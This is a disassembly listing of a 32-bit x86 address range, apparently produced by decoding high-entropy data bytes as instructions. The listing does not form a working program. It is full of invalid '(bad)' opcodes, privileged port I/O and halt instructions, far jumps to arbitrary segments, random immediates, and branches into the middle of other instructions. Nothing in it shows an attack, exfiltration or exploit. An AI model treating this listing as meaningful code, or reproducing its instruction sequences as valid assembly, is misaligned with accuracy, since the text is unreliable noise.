  411fca:	mov    edx,0xe9163e99
  411fcf:	ins    DWORD PTR es:[edi],dx
  411fd0:	push   0x4a37b7bd
  411fd5:	and    eax,0xa7c15588
  411fda:	das    
  411fdb:	lea    esi,cs:[ebx+0xf]
  411fdf:	ret    
  411fe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe1:	jo     0x412010
  411fe3:	les    ebp,FWORD PTR [edi+0x41698351]
  411fe9:	push   ss
  411fea:	rol    DWORD PTR [esi],0xdf
  411fed:	mov    ch,0x71
  411fef:	out    dx,eax
  411ff0:	ds test esi,ebx
  411ff3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ff4:	push   esp
  411ff5:	hlt    
  411ff6:	clc    
  411ff7:	xchg   edx,eax
  411ff8:	adc    al,BYTE PTR [ebx+0x51]
  411ffb:	xlat   BYTE PTR ds:[ebx]
  411ffc:	xor    DWORD PTR [esi+0x468e8a58],0x7
  412003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412004:	loopne 0x411f96
  412006:	jmp    0x569b:0x75ff53dc
  41200d:	js     0x412077
  41200f:	test   al,0x3a
  412011:	bound  edi,QWORD PTR [edx+0x5a8b0f61]
  412017:	add    BYTE PTR [edx+esi*1-0x7eaed650],al
  41201e:	mov    dh,0xdc
  412020:	outs   dx,BYTE PTR ds:[esi]
  412021:	jmp    0x7efeffb5
  412026:	repnz icebp 
  412028:	mov    al,0xd4
  41202a:	xor    edx,DWORD PTR [ebx-0x4b]
  41202d:	das    
  41202e:	push   es
  41202f:	hlt    
  412030:	bound  ebp,QWORD PTR [eax+esi*2+0x40]
  412034:	push   ss
  412035:	out    dx,al
  412036:	loopne 0x412066
  412038:	icebp  
  412039:	jae    0x41209e
  41203b:	mov    esi,0xa689c9ff
  412040:	and    al,0x8a
  412042:	push   ecx
  412043:	mov    ah,0xf9
  412045:	sbb    eax,0x32227e97
  41204a:	test   DWORD PTR [ebx-0x38],edx
  41204d:	(bad)  
  41204e:	mov    ch,0xfc
  412050:	(bad)  
  412051:	mov    ds:0x56d869ec,eax
  412056:	std    
  412057:	je     0x412089
  412059:	adc    dl,BYTE PTR [esi+0x34bc09fe]
  41205f:	stc    
  412060:	mov    bh,0x5
  412062:	pop    ecx
  412063:	add    eax,0x25d3d221
  412068:	jmp    0x1673:0x795e2b4a
  41206f:	mov    ch,0x28
  412071:	(bad)  
  412072:	adc    DWORD PTR [ebp-0x17b67fb6],eax
  412078:	sub    ebx,DWORD PTR [edx+0x37]
  41207b:	or     DWORD PTR [ecx-0x40],edi
  41207e:	mov    ah,0xe5
  412080:	pop    ds
  412081:	nop
  412082:	adc    eax,0xeb48e8fd
  412087:	sub    al,0x9e
  412089:	out    dx,al
  41208a:	hlt    
  41208b:	sahf   
  41208c:	or     eax,0x803025a6
  412091:	dec    DWORD PTR [esi]
  412093:	push   ebx
  412094:	adc    DWORD PTR [edx+0x71],ebx
  412097:	push   ebx
  412098:	mov    WORD PTR [edx],ds
  41209a:	xor    DWORD PTR [ebp+0x2ceb8364],ecx
  4120a0:	sub    eax,0xaf59aac9
  4120a5:	pop    ebp
  4120a6:	lea    ecx,ds:0x1e77ea8d
  4120ac:	(bad)  
  4120ad:	fdivrp st(4),st
  4120af:	pop    ss
  4120b0:	push   edi
  4120b1:	sbb    BYTE PTR [eax+0x20],ch
  4120b4:	je     0x412095
  4120b6:	call   0xb5cf1f35
  4120bb:	aad    0x1f
  4120bd:	sbb    eax,esp
  4120bf:	ret    0x9b01
  4120c2:	ror    ecx,cl
  4120c4:	mov    eax,0x112d55e1
  4120c9:	(bad)  
  4120ca:	call   DWORD PTR [edi-0x34]
  4120cd:	ja     0x412124
  4120cf:	pop    ebx
  4120d0:	stc    
  4120d1:	rcl    DWORD PTR [edx-0x4f],0x3c
  4120d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120d6:	(bad)  
  4120d7:	(bad)  
  4120d8:	and    eax,0x500805c9
  4120dd:	or     BYTE PTR [eax+ebx*2],ch
  4120e0:	adc    DWORD PTR [edi],edx
  4120e2:	and    edx,eax
  4120e4:	out    dx,al
  4120e5:	fist   WORD PTR [bx+0x911]
  4120ea:	int    0x9e
  4120ec:	loop   0x4120ec
  4120ee:	xchg   edi,eax
  4120ef:	outs   dx,DWORD PTR ds:[esi]
  4120f0:	and    bh,BYTE PTR [ebx-0x7]
  4120f3:	pushf  
  4120f4:	xchg   esp,eax
  4120f5:	adc    eax,0x9c4d3c12
  4120fa:	idiv   BYTE PTR [ebp-0x37d16032]
  412100:	dec    esi
  412101:	pusha  
  412102:	and    dh,bl
  412104:	inc    edi
  412105:	pop    ds
  412106:	(bad)  
  412107:	nop
  412108:	mov    al,0x78
  41210a:	dec    edx
  41210b:	ror    ecx,cl
  41210d:	std    
  41210e:	aam    0xf8
  412110:	or     al,0x28
  412112:	outs   dx,BYTE PTR ds:[esi]
  412113:	stos   BYTE PTR es:[edi],al
  412114:	sar    dh,0xc4
  412117:	sbb    dh,dl
  412119:	(bad)  
  41211a:	xchg   ecx,eax
  41211b:	push   cs
  41211c:	fisttp DWORD PTR [ebp+ebp*1+0x548e018f]
  412123:	jp     0x412122
  412125:	xchg   dl,cl
  412127:	js     0x412107
  412129:	or     eax,0xe5a3f90d
  41212e:	mov    ds:0x14462a0,al
  412133:	sbb    al,0xd7
  412135:	add    ch,ch
  412137:	push   ecx
  412138:	add    ah,bh
  41213a:	xor    eax,DWORD PTR [ecx+0x77729dfd]
  412140:	mov    bh,0x7c
  412142:	mov    ch,0x71
  412144:	aas    
  412145:	dec    ecx
  412146:	neg    DWORD PTR [esi-0x28]
  412149:	add    al,0xb3
  41214b:	clc    
  41214c:	inc    esp
  41214d:	fst    QWORD PTR [ebx+0x70]
  412150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412151:	retf   0x3f83
  412154:	push   eax
  412155:	xor    bl,dh
  412157:	inc    esp
  412158:	xlat   BYTE PTR ds:[ebx]
  412159:	sub    BYTE PTR [edi+0x8],dh
  41215c:	cli    
  41215d:	aaa    
  41215e:	xor    eax,0x7d33d6d6
  412163:	fs loop 0x41212c
  412166:	ja     0x4120f3
  412168:	mov    edi,0xf0f0f18f
  41216d:	xor    edi,DWORD PTR cs:[ebx+esi*2+0x41]
  412172:	imul   esp,DWORD PTR [eax+0x27],0x37
  412176:	and    cl,ah
  412178:	mov    bh,0xdb
  41217a:	xchg   esp,eax
  41217b:	mov    ebp,0xb4d35243
  412180:	(bad)  
  412182:	(bad)
  412186:	outs   dx,DWORD PTR ds:[esi]
  412187:	mov    cl,0x77
  412189:	ret    
  41218a:	or     ecx,DWORD PTR [edx-0x4a21267b]
  412190:	xchg   ebx,eax
  412191:	cmp    ah,bl
  412193:	mov    ecx,0x7de949b7
  412198:	mov    dh,0xd8
  41219a:	imul   ebx,ebx,0x56
  41219d:	rol    dl,cl
  41219f:	addr16 call 0x6781:0x4ec1b300
  4121a7:	mov    ebx,0xc6d7d8d
  4121ac:	rcl    BYTE PTR [eax],0xd5
  4121af:	jo     0x41214e
  4121b1:	mov    BYTE PTR [ecx+0x6d],cl
  4121b4:	sub    al,0xb2
  4121b6:	xor    DWORD PTR ds:0x10b718b6,0x5a
  4121bd:	imul   ebp,edx,0x44
  4121c0:	ret    0xa1fb
  4121c3:	push   esp
  4121c4:	mov    esp,0xdf68ea9a
  4121c9:	and    ebp,DWORD PTR [ecx+0x520902f9]
  4121cf:	dec    ebp
  4121d0:	inc    ebx
  4121d1:	(bad)
  4121d5:	stos   DWORD PTR es:[edi],eax
  4121d6:	rcl    BYTE PTR [ebx-0x23dc1137],1
  4121dc:	cmp    al,0x42
  4121de:	gs scas eax,DWORD PTR es:[edi]
  4121e0:	sbb    eax,0xba4ce98f
  4121e5:	or     eax,0x4461bb1e
  4121ea:	xchg   ebx,eax
  4121eb:	and    al,0x74
  4121ed:	add    al,0x1f
  4121ef:	ret    
  4121f0:	lea    esi,[edi]
  4121f2:	(bad)  {k2}{z}
  4121f7:	gs sbb al,0x4b
  4121fa:	in     eax,dx
  4121fb:	jnp    0x412219
  4121fd:	int3   
  4121fe:	int3   
  4121ff:	mov    ah,0x4b
  412201:	out    dx,al
  412202:	(bad)  
  412203:	(bad)  
  412204:	test   BYTE PTR [ecx],al
  412206:	jp     0x412268
  412208:	inc    eax
  412209:	cmp    esi,ebp
  41220b:	mov    edi,0x8deac436
  412211:	mov    ebx,0x6a52774d
  412216:	cmp    al,BYTE PTR [edx+edi*1+0x38]
  41221a:	sbb    al,0xd5
  41221c:	ds pop esi
  41221e:	icebp  
  41221f:	mov    al,ds:0x7c149bcc
  412224:	hlt    
  412225:	xchg   ebp,eax
  412226:	nop
  412227:	les    esi,FWORD PTR [ebp+0x3]
  41222a:	das    
  41222b:	jmp    0x4121c1
  41222d:	and    DWORD PTR [ecx-0x18],0x78
  412231:	push   ecx
  412232:	mov    esp,0xb79388f4
  412237:	jge    0x412283
  412239:	sbb    eax,0xcb10e7a0
  41223e:	and    ecx,DWORD PTR [ebx]
  412240:	dec    ecx
  412241:	xchg   ebx,eax
  412242:	sahf   
  412243:	sbb    al,0x95
  412245:	push   edi
  412246:	ss nop
  412248:	ror    BYTE PTR [ecx+0x3e3deb52],0xb4
  41224f:	aas    
  412250:	stos   BYTE PTR es:[edi],al
  412251:	adc    BYTE PTR [ebp+0x6d],0xcd
  412255:	jg     0x4121f6
  412257:	bound  esi,QWORD PTR [edx]
  412259:	and    al,0x9
  41225b:	lock in al,0x71
  41225e:	add    eax,0x94a171e9
  412263:	scas   eax,DWORD PTR es:[edi]
  412264:	adc    eax,0xe144c46f
  412269:	jb     0x412228
  41226b:	fist   DWORD PTR [edi]
  41226d:	in     eax,0x4f
  41226f:	inc    edx
  412270:	std    
  412271:	push   ebp
  412272:	add    DWORD PTR [esi-0x13151adf],eax
  412278:	and    cl,dh
  41227a:	stos   DWORD PTR es:[edi],eax
  41227b:	arpl   dx,si
  41227d:	jg     0x4122d4
  41227f:	add    esi,eax
  412281:	stos   BYTE PTR es:[edi],al
  412282:	mov    dh,0xcf
  412284:	mov    ebx,DWORD PTR [esi]
  412286:	fwait
  412287:	xchg   ecx,eax
  412288:	mov    dh,0x7d
  41228a:	arpl   WORD PTR [ecx-0x60],cx
  41228d:	out    dx,eax
  41228e:	xchg   ecx,eax
  41228f:	jp     0x4122a5
  412291:	ret    0xa4dd
  412294:	xor    eax,0x8fbcaa7f
  412299:	dec    ebp
  41229a:	mov    al,ds:0xe2333be9
  41229f:	pop    ss
  4122a0:	les    esp,FWORD PTR [eax+eiz*8+0x2f993384]
  4122a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122a8:	xchg   edi,eax
  4122a9:	mov    ebx,fs
  4122ab:	mov    bl,0x6e
  4122ad:	push   ecx
  4122ae:	sbb    esp,DWORD PTR [edi-0x690d7c11]
  4122b4:	push   ecx
  4122b5:	call   0xadccfe5b
  4122ba:	rol    ah,1
  4122bc:	mov    ebp,0x647d051d
  4122c1:	outs   dx,DWORD PTR ds:[esi]
  4122c2:	xchg   DWORD PTR [ebx+ebx*8-0x132b9e83],edx
  4122c9:	cwde   
  4122ca:	mov    cl,dl
  4122cc:	xlat   BYTE PTR ds:[ebx]
  4122cd:	add    bh,BYTE PTR [edi-0x4]
  4122d0:	imul   ecx,edx,0xffffff9e
  4122d3:	xchg   edx,eax
  4122d4:	int3   
  4122d5:	jmp    0x41233e
  4122d7:	jb     0x4122ff
  4122d9:	(bad)  
  4122db:	sbb    esi,DWORD PTR [ebx]
  4122dd:	imul   edi,DWORD PTR [esi-0x28],0xffffffa1
  4122e1:	pusha  
  4122e2:	addr16 pop esi
  4122e4:	sub    bl,BYTE PTR [eax]
  4122e6:	ins    BYTE PTR es:[edi],dx
  4122e7:	cmp    BYTE PTR [edx],bh
  4122e9:	xchg   edx,eax
  4122ea:	sbb    al,0x19
  4122ec:	shr    DWORD PTR es:[ebx],0x51
  4122f0:	sbb    DWORD PTR [edx+0x57520541],eax
  4122f6:	add    DWORD PTR [esi-0x578c14be],edi
  4122fc:	retf   
  4122fd:	jnp    0x412286
  4122ff:	xor    DWORD PTR [eax+edi*4],ebp
  412302:	je     0x412299
  412304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412305:	inc    ebp
  412306:	mov    ds:0xa20f0602,al
  41230b:	push   0x68
  41230d:	jae    0x412295
  41230f:	popa   
  412310:	mov    ebp,DWORD PTR [ebx-0x76abd8ce]
  412316:	push   esp
  412317:	push   ebx
  412318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412319:	adc    al,0x2c
  41231b:	push   edi
  41231c:	pop    ebp
  41231d:	xchg   edx,eax
  41231e:	repz pop esi
  412320:	or     al,0x8b
  412322:	loope  0x4122cf
  412324:	xor    cl,dh
  412326:	lahf   
  412327:	xor    BYTE PTR [edx+0x79],ah
  41232a:	jo     0x4122e7
  41232c:	test   BYTE PTR [edx],0xac
  41232f:	std    
  412330:	in     al,dx
  412331:	xor    ecx,ecx
  412333:	out    0x98,al
  412335:	js     0x41236d
  412337:	jge    0x4122dc
  412339:	das    
  41233a:	sbb    eax,0x74384a
  41233f:	and    edx,DWORD PTR [edx]
  412341:	adc    edi,edx
  412343:	pop    es
  412344:	sbb    ecx,DWORD PTR [esi+0xe]
  412347:	loop   0x412338
  412349:	retf   
  41234a:	pop    ecx
  41234b:	je     0x4123b1
  41234d:	xlat   BYTE PTR ds:[ebx]
  41234e:	and    eax,0xdfcbed2a
  412353:	pushf  
  412354:	in     eax,0x3d
  412356:	fistp  QWORD PTR [ebx-0x274e7c2f]
  41235c:	jno    0x412372
  41235e:	lods   eax,DWORD PTR ds:[esi]
  41235f:	rol    esp,0xe8
  412362:	das    
  412363:	adc    BYTE PTR [ebx+0x1b],0x79
  412367:	xchg   esi,eax
  412368:	jne    0x412311
  41236a:	cmp    BYTE PTR [eax],al
  41236c:	sub    dl,BYTE PTR [ebp+eax*1+0x1c]
  412370:	jle    0x4123ab
  412372:	test   DWORD PTR [eax-0x2057ec20],0xd15851b0
  41237c:	dec    ebx
  41237d:	mov    ch,0x9f
  41237f:	(bad)  
  412380:	loopne 0x412328
  412382:	fs and al,0x27
  412385:	imul   eax,DWORD PTR [eax],0x29d8d8b
  41238b:	test   BYTE PTR [eax-0x28741227],dl
  412391:	push   edx
  412392:	les    ebp,FWORD PTR [edi]
  412394:	add    edi,DWORD PTR [ebp+0x4d]
  412397:	aam    0xed
  412399:	push   ecx
  41239a:	add    DWORD PTR [edi+0x1c899299],edx
  4123a0:	dec    ecx
  4123a1:	push   edi
  4123a2:	maxps  xmm4,XMMWORD PTR [edi+0x5b]
  4123a6:	push   edi
  4123a7:	and    bh,BYTE PTR [eax+0x4a]
  4123aa:	jmp    0xab25:0x8fe5c6db
  4123b1:	xchg   ebx,eax
  4123b2:	add    eax,0x39e6200c
  4123b7:	imul   eax,DWORD PTR [edx+0x76577887],0xe34ddb5e
  4123c1:	int    0xad
  4123c3:	pop    edx
  4123c4:	pop    edx
  4123c5:	arpl   WORD PTR gs:[edx-0x61],sp
  4123c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ca:	cmp    al,0x1b
  4123cc:	xor    edi,DWORD PTR [edi+0x7f]
  4123cf:	mov    al,0x9f
  4123d1:	and    al,0xf
  4123d3:	pop    ebx
  4123d4:	imul   esp,ebp,0xffffffc3
  4123d7:	(bad)  
  4123d8:	jae    0x412385
  4123da:	(bad)  
  4123db:	mov    ds:0xb4da6f7c,eax
  4123e0:	jl     0x41239f
  4123e2:	mov    bl,0x65
  4123e4:	cmp    bl,BYTE PTR [ebx+ebx*2]
  4123e7:	jb     0x412420
  4123e9:	stos   BYTE PTR es:[edi],al
  4123ea:	mov    bl,0xe6
  4123ec:	fstp   QWORD PTR [ebp-0x4e32d0b4]
  4123f2:	mov    ch,0x77
  4123f4:	cld    
  4123f5:	dec    edx
  4123f6:	or     al,BYTE PTR [ecx+0x2f]
  4123f9:	and    al,0xbb
  4123fb:	pushf  
  4123fc:	out    0x3a,eax
  4123fe:	add    bh,dh
  412400:	pop    esi
  412401:	mov    ecx,esi
  412403:	mov    al,ds:0x316de3c3
  412408:	dec    eax
  412409:	push   ebp
  41240a:	ficomp DWORD PTR ds:0xb47753
  412410:	aas    
  412411:	lods   al,BYTE PTR ds:[esi]
  412412:	jmp    0xa8ae54c6
  412417:	xchg   ebx,eax
  412418:	retf   0xf117
  41241b:	push   ds
  41241c:	adc    al,0x77
  41241e:	mov    BYTE PTR [ebp+0x23],dh
  412421:	lock in al,dx
  412423:	xchg   ebp,eax
  412424:	dec    esp
  412425:	scas   al,BYTE PTR es:[edi]
  412426:	stc    
  412427:	mov    eax,ebx
  412429:	dec    esp
  41242a:	xchg   edi,eax
  41242b:	lock xor eax,0xd55106ad
  412431:	mov    edi,esp
  412433:	xor    al,0xa5
  412435:	xchg   edx,eax
  412436:	aaa    
  412437:	dec    ecx
  412438:	mov    ebp,0xa05d2e07
  41243d:	cwde   
  41243e:	inc    ebx
  41243f:	or     DWORD PTR [ecx],ecx
  412441:	dec    esi
  412442:	ins    BYTE PTR es:[edi],dx
  412443:	dec    esp
  412445:	or     eax,DWORD PTR [esi+0x7c7d19eb]
  41244b:	out    dx,eax
  41244c:	inc    eax
  41244d:	xchg   ebp,eax
  41244e:	aad    0xda
  412450:	adc    eax,0xe749eca
  412455:	cmp    al,0xe6
  412457:	leave  
  412458:	sar    DWORD PTR [eax+0x43],0xc9
  41245c:	scas   al,BYTE PTR es:[edi]
  41245d:	inc    esp
  41245e:	in     al,0x82
  412460:	(bad)  [ebx-0x29]
  412463:	xor    eax,DWORD PTR [esi+0x52772781]
  412469:	push   esi
  41246a:	mov    ds:0x903850d,al
  41246f:	xchg   esi,eax
  412470:	push   0x2e
  412472:	sbb    al,0xc4
  412474:	idiv   BYTE PTR [eax]
  412476:	cld    
  412477:	jae    0x412433
  412479:	jmp    0x412417
  41247b:	loop   0x4124f8
  41247d:	and    BYTE PTR [esi],0x39
  412480:	mov    ch,0x27
  412482:	(bad)
  412485:	aam    0x7b
  412487:	inc    ebp
  412488:	xchg   esp,eax
  412489:	sub    bl,0xb8
  41248c:	mov    bl,0x6a
  41248e:	mov    ch,BYTE PTR [edx]
  412490:	mov    ch,0xc
  412492:	(bad)  
  412493:	bound  eax,QWORD PTR [edi+0x5b47a0e4]
  412499:	adc    al,0x37
  41249b:	out    0x96,al
  41249d:	xchg   esp,eax
  41249e:	xchg   edx,eax
  41249f:	cld    
  4124a0:	mov    bl,0x58
  4124a2:	add    al,0x62
  4124a4:	cmp    ch,0x67
  4124a7:	mov    ds:0xcb2dca76,al
  4124ac:	bound  ebp,QWORD PTR [edi-0x2d]
  4124af:	ss js  0x412477
  4124b2:	push   edi
  4124b3:	adc    esp,DWORD PTR [esi]
  4124b5:	cmp    esi,DWORD PTR [ebp+0x10]
  4124b8:	xor    al,0x45
  4124ba:	add    al,0x22
  4124bc:	shr    BYTE PTR [esp+ebp*2+0x2f],0xd3
  4124c1:	pushf  
  4124c2:	les    esi,FWORD PTR [esi-0x38]
  4124c5:	inc    edi
  4124c6:	nop
  4124c7:	pop    edx
  4124c8:	into   
  4124c9:	or     BYTE PTR [edi+eiz*1],dh
  4124cc:	test   esi,ebx
  4124ce:	push   0x4314d9d
  4124d3:	daa    
  4124d4:	(bad)  [eax+0x6e8bbb7a]
  4124da:	mov    esp,0xdebc1c16
  4124df:	mov    cl,0x9d
  4124e1:	in     eax,0x26
  4124e3:	jb     0x4124b1
  4124e5:	mov    ecx,DWORD PTR [edi]
  4124e7:	sbb    al,0xd3
  4124e9:	mov    bh,0xeb
  4124eb:	hlt    
  4124ec:	xchg   edi,eax
  4124ed:	mov    WORD PTR [ecx],?
  4124ef:	iret   
  4124f0:	cwde   
  4124f1:	sbb    eax,0x79632666
  4124f6:	in     eax,dx
  4124f7:	inc    edi
  4124f8:	adc    BYTE PTR [esp+ebp*4],0x7
  4124fc:	sahf   
  4124fd:	pop    es
  4124fe:	xor    eax,0x62f98497
  412503:	outs   dx,BYTE PTR ds:[esi]
  412504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412505:	stos   BYTE PTR es:[edi],al
  412506:	mov    BYTE PTR [esi-0x5ceb8801],bl
  41250c:	(bad)  
  41250d:	push   ebp
  41250e:	sbb    eax,0xf9841cca
  412513:	mov    al,ds:0xc8d4f66a
  412518:	jmp    0x412529
  41251a:	leave  
  41251b:	mov    ch,0xac
  41251d:	call   0xe7ba:0x8797a180
  412524:	and    BYTE PTR [eax+edi*2],0xb
  412528:	in     eax,0x95
  41252a:	lods   eax,DWORD PTR ds:[esi]
  41252b:	push   esi
  41252c:	jae    0x4124e7
  41252e:	fwait
  41252f:	jmp    0xa975:0xe1d7a453
  412536:	mov    ecx,0xa774eae5
  41253b:	lds    ebp,FWORD PTR [ebp+0x3d]
  41253e:	push   ss
  41253f:	push   es
  412540:	push   ss
  412541:	pushf  
  412542:	(bad)  
  412543:	ja     0x4124c7
  412545:	or     al,BYTE PTR [bx+di]
  412548:	fisub  DWORD PTR [edx]
  41254a:	mov    ds:0x9cb18f16,al
  41254f:	xchg   esi,eax
  412550:	pop    ebp
  412551:	ret    0x9f37
  412554:	shl    ah,1
  412556:	pop    esp
  412557:	mov    ecx,0xcd97faaf
  41255c:	loop   0x41250d
  41255e:	cs dec ebp
  412560:	jmp    0x412508
  412562:	xlat   BYTE PTR ds:[ebx]
  412563:	dec    esp
  412564:	mov    esi,0xd8ec4a90
  412569:	fmul   QWORD PTR [ecx]
  41256b:	inc    esi
  41256c:	addr16 push ebx
  41256e:	mov    eax,ds:0x171ea5a7
  412573:	jg     0x412582
  412575:	jle    0x412528
  412577:	xor    edi,DWORD PTR [esi-0x1acf4a4]
  41257d:	and    eax,0xdf38af8
  412582:	lods   eax,DWORD PTR ds:[esi]
  412583:	adc    BYTE PTR [ebx+0x23dd2afb],al
  412589:	and    BYTE PTR [eax+0x1e1a6ff9],bh
  41258f:	icebp  
  412590:	push   ecx
  412591:	fwait
  412592:	xchg   BYTE PTR [eax-0x11],dh
  412595:	call   0xc7d2cd8e
  41259a:	mov    esp,0xe8606ee4
  41259f:	inc    esi
  4125a0:	mov    ch,bh
  4125a2:	or     BYTE PTR [edi+0x59],ah
  4125a5:	or     bl,BYTE PTR [ebx+0x6f337d02]
  4125ab:	xchg   DWORD PTR [edx+0x1c],ecx
  4125ae:	int    0x99
  4125b0:	mov    al,ds:0x30524dce
  4125b5:	sahf   
  4125b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125b7:	addr16 push eax
  4125b9:	and    dl,BYTE PTR ds:0x10bb4e64
  4125bf:	jl     0x4125dc
  4125c1:	sub    eax,0xdd063476
  4125c6:	pop    eax
  4125c7:	ins    BYTE PTR es:[edi],dx
  4125c8:	push   cs
  4125c9:	xor    BYTE PTR [edi+0x36],dl
  4125cc:	mov    ebp,esp
  4125ce:	push   ebx
  4125cf:	pop    esp
  4125d0:	mov    dh,BYTE PTR [eax+ebx*8]
  4125d3:	jge    0x412559
  4125d5:	mov    esi,cs
  4125d7:	dec    ebp
  4125d8:	mov    gs,ecx
  4125da:	sbb    esp,DWORD PTR [ebx-0x11]
  4125dd:	and    eax,esp
  4125df:	mov    bl,0x6a
  4125e1:	enter  0xeaa6,0x5c
  4125e5:	pop    edi
  4125e6:	inc    edi
  4125e7:	mov    dh,bh
  4125e9:	add    dl,BYTE PTR [edi-0x47a5834c]
  4125ef:	sub    DWORD PTR [ecx-0x17],ebp
  4125f2:	icebp  
  4125f3:	adc    eax,0xa917a8d1
  4125f8:	sbb    al,0xc
  4125fa:	cs pop ebx
  4125fc:	in     al,dx
  4125fd:	std    
  4125fe:	adc    al,BYTE PTR [ebx]
  412600:	jge    0x4125e1
  412602:	mov    dl,0x75
  412604:	out    dx,eax
  412605:	and    bh,BYTE PTR [ebp-0x4f75648e]
  41260b:	pushf  
  41260c:	fwait
  41260d:	retf   0x4cc9
  412610:	and    DWORD PTR [ecx],esp
  412612:	inc    edi
  412613:	cs hlt 
  412615:	stc    
  412616:	jb     0x41265e
  412618:	sbb    edx,0xe06f3a66
  41261e:	jno    0x41263e
  412620:	push   es
  412621:	aaa    
  412622:	outs   dx,DWORD PTR ds:[esi]
  412623:	lock sti 
  412625:	inc    ebx
  412626:	pop    ebx
  412627:	mov    ebx,0x32720656
  41262c:	mov    BYTE PTR [esp+ebp*1],ah
  41262f:	xchg   edx,eax
  412630:	mov    dl,0xe0
  412632:	xchg   esp,eax
  412633:	nop
  412634:	pop    ds
  412635:	xor    DWORD PTR [ebx-0x354cb0a3],edi
  41263b:	idiv   esp
  41263d:	sub    ah,BYTE PTR [ebp+eiz*2-0x53]
  412641:	inc    ebp
  412642:	jmp    0x33164ae
  412647:	clc    
  412648:	cmc    
  412649:	int3   
  41264a:	ins    DWORD PTR es:[edi],dx
  41264b:	daa    
  41264c:	or     esp,esp
  41264e:	ret    0x5652
  412651:	(bad)  [ecx+0x6a063d61]
  412657:	sub    al,0x22
  412659:	pusha  
  41265a:	pop    esp
  41265b:	(bad)  
  41265c:	push   ebx
  41265d:	sbb    DWORD PTR [edx-0x36],edx
  412660:	sbb    DWORD PTR [esi+0x23],edx
  412663:	adc    ebp,DWORD PTR [esi+ebx*1]
  412666:	pushw  es
  412668:	cmp    al,0x10
  41266a:	adc    BYTE PTR [ecx-0x79],cl
  41266d:	or     DWORD PTR [edi],esp
  41266f:	pop    edi
  412670:	adc    dl,BYTE PTR [eax+0x76]
  412673:	sahf   
  412674:	test   eax,0xfbdcbbfe
  412679:	pop    esp
  41267a:	mov    DWORD PTR [eax+ebp*8-0x38e4fe67],ecx
  412681:	sbb    edx,edx
  412683:	jle    0x4126ae
  412685:	popa   
  412686:	jl     0x412694
  412688:	test   DWORD PTR [edx],esp
  41268a:	std    
  41268b:	mov    ds:0xad508b49,al
  412690:	ret    
  412691:	xchg   ecx,eax
  412692:	test   DWORD PTR [eax],eax
  412694:	(bad)  
  412695:	mov    DWORD PTR [eax-0x38dcf47e],edi
  41269b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41269d:	out    0xd,eax
  41269f:	mov    dh,dh
  4126a1:	push   ebp
  4126a2:	dec    esp
  4126a3:	mov    edx,0xd9188031
  4126a8:	sti    
  4126a9:	mov    esi,0xa62dc139
  4126ae:	and    al,0xe1
  4126b0:	mov    bl,0x3d
  4126b2:	xchg   edi,eax
  4126b3:	pushf  
  4126b4:	cld    
  4126b5:	dec    edx
  4126b6:	mov    ?,WORD PTR [edi*8+0x7f18914]
  4126bd:	aaa    
  4126be:	inc    edx
  4126bf:	repz cwde 
  4126c1:	loopne 0x41270f
  4126c3:	sar    DWORD PTR [ebx],1
  4126c5:	push   0x44
  4126c7:	jnp    0x41264e
  4126c9:	xchg   esp,eax
  4126ca:	pop    esi
  4126cb:	mov    ebx,0xad737a0e
  4126d0:	loopne 0x41268d
  4126d2:	loop   0x4126be
  4126d4:	enter  0xbccd,0x9f
  4126d8:	jnp    0x41270e
  4126da:	icebp  
  4126db:	pop    es
  4126dc:	fst    DWORD PTR [ebx-0x1b886204]
  4126e2:	adc    eax,0x1f4e2515
  4126e7:	dec    ebx
  4126e8:	cmp    eax,0x3c4a507e
  4126ed:	push   esp
  4126ee:	add    al,0xa0
  4126f0:	out    dx,eax
  4126f1:	mov    dh,0xd7
  4126f3:	push   ebx
  4126f4:	mov    dh,dh
  4126f6:	jmp    0xabfdd445
  4126fb:	popa   
  4126fc:	cmp    BYTE PTR [edx],bl
  4126fe:	lods   al,BYTE PTR ds:[esi]
  4126ff:	mov    dl,al
  412701:	xchg   ebp,eax
  412702:	inc    esi
  412703:	pop    esp
  412704:	les    ebp,FWORD PTR ss:[ebp-0x27]
  412708:	push   esp
  412709:	div    BYTE PTR [ecx+ebp*2+0x3f]
  41270d:	outs   dx,DWORD PTR ds:[esi]
  41270e:	mov    eax,edi
  412710:	lds    ebp,FWORD PTR [edx+eax*2+0x40dfe911]
  412717:	adc    esi,ecx
  412719:	or     eax,DWORD PTR [ebx+esi*8]
  41271c:	loope  0x412770
  41271e:	add    DWORD PTR [ebx+0x76138383],ebp
  412724:	dec    ecx
  412725:	repz mov ch,dh
  412728:	push   ss
  412729:	sub    ah,BYTE PTR ds:0x62f06ccd
  41272f:	sub    al,0x38
  412731:	sbb    al,0x43
  412733:	mov    cl,0x54
  412735:	add    bh,dl
  412737:	mov    esi,0x741bab35
  41273c:	cmp    BYTE PTR [edx+0x519358b0],bh
  412742:	xor    BYTE PTR [esi-0x77cd0f42],ah
  412748:	test   BYTE PTR [edx+0x5],ah
  41274b:	push   ds
  41274c:	fsub   st,st(3)
  41274e:	cmp    esi,DWORD PTR [eax+0x3f114bf0]
  412754:	jmp    0x8019cec1
  412759:	std    
  41275a:	les    eax,FWORD PTR [esi]
  41275c:	stc    
  41275d:	(bad)  
  41275e:	in     al,dx
  41275f:	mov    bl,0x4a
  412761:	aam    0x72
  412763:	cmp    esp,DWORD PTR [edx+eax*8-0x147a5e47]
  41276a:	push   cs
  41276b:	repnz into 
  41276d:	scas   eax,DWORD PTR es:[edi]
  41276e:	jnp    0x41277c
  412770:	sti    
  412771:	jmp    0x412728
  412773:	call   0xf9a9f433
  412778:	outs   dx,BYTE PTR ds:[esi]
  412779:	ja     0x412725
  41277b:	jne    0x4127a5
  41277d:	ret    
  41277e:	adc    al,ah
  412780:	mov    ?,WORD PTR [ecx+0xe]
  412783:	and    eax,0x4e354838
  412788:	clc    
  412789:	xchg   ebx,eax
  41278a:	ins    DWORD PTR es:[edi],dx
